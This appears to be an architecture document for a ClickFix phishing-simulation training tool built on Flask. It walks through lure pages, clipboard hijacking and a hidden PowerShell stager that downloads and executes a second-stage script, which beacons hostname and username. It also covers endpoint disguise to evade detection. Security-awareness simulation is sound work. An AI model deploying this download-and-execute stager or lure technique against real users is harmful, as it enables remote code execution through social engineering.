# Technical Architecture & Stealth Mechanisms

This document details the internal architecture of the ClickFix Training Tool, focusing on the payload delivery mechanism, stealth features, and data flow.

## System Overview

The application is built on **Flask** (Python) and follows a modular blueprint architecture.

*   **Core App (`app/`):** Handles routing, configuration, and database interactions.
*   **Database (`instance/training_log.db`):** SQLite database storing Campaigns, Targets, and Events.
*   **Templates (`templates/`):** Jinja2 templates for lures, traps, and the admin dashboard.

## The Attack Chain

The "ClickFix" (or ClearFake) technique relies on social engineering to bypass security controls. Instead of downloading a file, the user is tricked into manually executing code.

### 1. The Lure (Page View)
*   **User Action:** Victim visits a link (e.g., `/s/teams_error`).
*   **Backend:** `app/blueprints/lure.py` handles the request.
    *   Logs `PAGE_VIEW` event.
    *   Generates a unique `user_id` if one isn't provided.
    *   Renders the template (Lure or Cloned Site) with the injected Trap.

### 2. The Trap (Interaction)
*   **User Action:** Victim clicks the "Fix" or "Verify" button in the trap.
*   **Frontend:** `triggerClickFix()` in `base_layout.html` is called.
    *   **Clipboard Write:** Uses `navigator.clipboard.writeText(payload)` to copy the malicious command.
    *   **Tracking:** Sends an AJAX POST to `/track/click/<uid>` to log `BUTTON_CLICK`.
    *   **Instruction:** Displays the overlay instructing the user to open the Run dialog (Win+R) and paste (Ctrl+V).

### 3. The Payload (Execution)
The payload is a two-stage PowerShell script designed to be stealthy and bypass length restrictions in the Windows Run dialog.

#### Stage 1: The Stager (Clipboard)
This is the code copied to the user's clipboard. It is generated in `app/utils.py`.

```powershell
powershell -w h -c "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; $wc = New-Object System.Net.WebClient; iex $wc.DownloadString('https://training.local/api/v2/config/123')"
```

*   `powershell`: Runs PowerShell.
*   `-w h`: Short for `-WindowStyle Hidden`. Hides the PowerShell window immediately.
*   `-c`: Executes the following command.
*   `iex`: Alias for `Invoke-Expression`. Executes the string downloaded from the URL.
*   `DownloadString`: Fetches the Stage 2 payload from the server.

**Why this approach?**
*   **Length:** The Windows Run dialog has a character limit. This stager is short.
*   **Obfuscation:** The actual malicious logic is not on the clipboard, only a downloader.

#### Stage 2: The Beacon (Server-Side)
This script is served by `app/blueprints/stealth.py` at the endpoint defined in the stager.

```powershell
# 1. Callback to verify execution
$wc = New-Object System.Net.WebClient
$url = "https://training.local/verify/123?h=$env:COMPUTERNAME&u=$env:USERNAME"
$wc.DownloadString($url) | Out-Null

# 2. Show Training Message
Add-Type -AssemblyName PresentationFramework
[System.Windows.MessageBox]::Show('This was a security training simulation.', 'Security Alert', 'OK', 'Warning')

# 3. Open Training Page
Start-Process "https://training.local/training"
```

*   **Callback:** It makes a request back to the server (`/verify/<uid>`) including the hostname and username.
*   **Logging:** The server logs this as a `PAYLOAD_EXECUTED` event. This confirms the user actually ran the code, not just clicked the button.
*   **Feedback:** It displays a harmless MessageBox and opens the training landing page to educate the user.

### 4. Training (Education)
Once the user lands on the training page (`/training`), their engagement is tracked to ensure they consume the educational material.

*   **Scroll Tracking:** `static/js/training.js` uses `IntersectionObserver` to detect when sections of the training content are viewed.
*   **Events:**
    *   `TRAINING_VIEWED`: Logged when the training page loads.
    *   `TRAINING_COMPLETED`: Logged when the user scrolls to the bottom.
    *   `TRAINING_ACKNOWLEDGED`: Logged when the user clicks the "I Understand" button.

## Stealth Features

### Dynamic Routing
To avoid detection by static signatures, the application allows configuring custom endpoints for the payload and tracking URLs.

In `config.py` or environment variables:
*   `ENDPOINT_PAYLOAD`: Default `/api/v2/config` (Looks like a config fetch)
*   `ENDPOINT_VERIFY`: Default `/verify`
*   `ENDPOINT_TRACK`: Default `/track/click`

### Nested Slugs
The application supports nested slugs for campaigns (e.g., `/s/microsoft/login/v2`). This allows for more convincing URLs that mimic legitimate directory structures.

### User-Agent Filtering
The `log_event` function analyzes the User-Agent string to determine the victim's platform (Windows, macOS, Linux). This helps in reporting and analyzing which users are most vulnerable (though the PowerShell payload only works on Windows).

## Security Considerations

*   **HTTPS Requirement:** The Clipboard API (`navigator.clipboard`) **only** works in a Secure Context (HTTPS or localhost). The attack will fail silently over HTTP.
*   **Payload Safety:** The tool is designed to be safe. The payload strictly performs a callback and shows a message. It does not persist, escalate privileges, or access sensitive data.
*   **Authentication:** The Admin Dashboard and sensitive endpoints are protected by Basic Auth.